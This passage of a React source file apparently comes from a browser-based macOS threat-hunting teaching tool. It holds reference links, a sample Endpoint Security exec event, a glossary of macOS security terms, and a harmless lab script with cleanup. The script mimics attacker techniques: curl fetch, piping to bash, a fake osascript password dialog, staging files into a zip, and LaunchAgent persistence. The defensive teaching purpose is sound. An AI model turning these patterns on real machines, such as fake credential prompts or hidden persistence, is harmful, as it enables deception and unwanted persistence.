                  <li><Ext href="https://attack.mitre.org/matrices/enterprise/macos/">MITRE ATT&amp;CK for macOS</Ext>, the technique
                    IDs every finding here cites</li>
                </ul>
              </section>
              <section>
                <h3>Tools and research</h3>
                <ul>
                  <li><Ext href="https://github.com/redcanaryco/mac-monitor">Mac Monitor</Ext>, a graphical Endpoint Security
                    recorder whose traces load here</li>
                  <li><Ext href="https://www.jamf.com/blog/category/jamf-threat-labs/">Jamf Threat Labs</Ext>, write-ups of current
                    macOS malware</li>
                </ul>
              </section>
            </div>
          </Section>
          <p className="gfoot muted small">Links open in a new tab. This page sends nothing anywhere: like the rest of Gameleira it
            runs entirely in your browser.</p>
        </article>
      </main>
    </div>
  );
}

const EXEC_SAMPLE = `{
  "time": "2026-03-14T09:12:05.000000Z",
  "global_seq_num": 412,
  "version": 11,
  "schema_version": 1,
  "process": {
    "audit_token": { "pid": 7004, "pidversion": 9004, "euid": 501 },
    "ppid": 7000, "original_ppid": 7000, "group_id": 7003, "session_id": 7000,
    "executable": { "path": "/bin/zsh" },
    "signing_id": "com.apple.zsh", "is_platform_binary": true
  },
  "event": {
    "exec": {
      "target": {
        "audit_token": { "pid": 7004, "pidversion": 9005, "euid": 501 },
        "executable": { "path": "/bin/bash" },
        "signing_id": "com.apple.bash", "is_platform_binary": true
      },
      "args": ["bash"],
      "cwd": { "path": "/Users/alice" }
    }
  }
}`;

const LAB_SCRIPT = `# 1. delivery: fetch with curl (no quarantine flag)
curl -s https://example.com -o /tmp/page.html
xattr -l /tmp/page.html

# 2. curl | bash style execution
echo 'echo "hello from a fake payload"; whoami' | bash

# 3. a dialog like a fake password prompt (just click OK)
osascript -e 'display dialog "PRACTICE: not a real prompt" buttons {"OK"}'

# 4. collection and staging
mkdir -p /tmp/stage && cp /etc/hosts /tmp/stage/ && ditto -c -k /tmp/stage /tmp/stage.zip

# 5. detach from the parent
(sleep 90 &)

# 6. an app started by launchd on your behalf
open -a Calculator

# 7. persistence
cat > ~/Library/LaunchAgents/com.test.practice.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.test.practice</string>
  <key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>date &gt; /tmp/practice.txt</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.test.practice.plist`;

const LAB_CLEANUP = `launchctl bootout gui/$(id -u)/com.test.practice
rm ~/Library/LaunchAgents/com.test.practice.plist
rm -rf /tmp/stage /tmp/stage.zip /tmp/page.html /tmp/practice.txt`;

const WORDS: [string, ReactNode][] = [
  ['launchd', <>Process 1. Starts everything else, and runs launch agents (per user) and launch daemons (as root).</>],
  ['launchctl', <>The command that talks to launchd: load, start and stop jobs.</>],
  ['XPC', <>Apple’s messaging between processes. Services are started on demand by launchd.</>],
  ['Apple Events', <>Messages one app sends another to script it (AppleScript’s <C>tell application</C>). They start no
    process, so no tree shows them.</>],
  ['osascript', <>Runs AppleScript or JavaScript for Automation from the command line. A favourite of malware.</>],
  ['Endpoint Security (ES)', <>Apple’s framework for security monitoring; <C>eslogger</C> is its built-in client.</>],
  ['Audit token', <>The record that identifies a process: pid, pidversion, user and group IDs, session.</>],
  ['Responsible process', <>The app macOS holds accountable for a helper. It is also the app a privacy prompt names.</>],
  ['Mach-O', <>The macOS executable format, as ELF is on Linux. A universal binary holds code for Intel and Apple
    silicon.</>],
  ['.app bundle', <>A folder that looks like one file: the program is in <C>Contents/MacOS/</C>, its settings in{' '}
    <C>Contents/Info.plist</C>.</>],
  ['plist', <>Property list: a settings file in XML or binary. <C>plutil -p</C> prints either.</>],
  ['Code signature, Team ID', <>Who built a binary. Check with <C>codesign -dvvv</C>. Apple’s own binaries are platform
    binaries.</>],
  ['Ad-hoc signature', <>A signature with no developer identity. Normal for things you build yourself and for Homebrew;
    suspicious for a downloaded app.</>],
  ['Notarization', <>Apple scanned the developer’s upload before release. Check with <C>spctl -a -vvv</C>. Notarized malware
    does exist.</>],
  ['Quarantine flag', <>The <C>com.apple.quarantine</C> attribute browsers put on downloads. <C>xattr -l</C> shows it; files
    fetched with <C>curl</C> do not get it.</>],
  ['Gatekeeper', <>Checks a quarantined app’s signature and notarization the first time it opens.</>],
  ['TCC', <>Transparency, Consent and Control: the privacy permissions (Full Disk Access, Accessibility, Screen
    Recording, camera, microphone).</>],
  ['SIP', <>System Integrity Protection: system files that even root cannot change. <C>csrutil status</C> shows it.</>],
  ['XProtect', <>macOS’s built-in malware scanner. Its signatures are YARA rules, readable on any Mac.</>],
  ['Keychain', <>The encrypted store of passwords and keys. Command line: <C>security</C>. The first target of every
    info-stealer.</>],
  ['BTM', <>Background Task Management: the part of macOS that tracks login items and launch agents and daemons, and shows
    “Background Items Added”.</>],
  ['Unified log', <>The system-wide log, read with <C>log show</C>. Useful when there is no Endpoint Security capture.</>],
  ['ClickFix', <>A lure that talks the user into pasting a command into Terminal, which skips Gatekeeper entirely.</>],
];
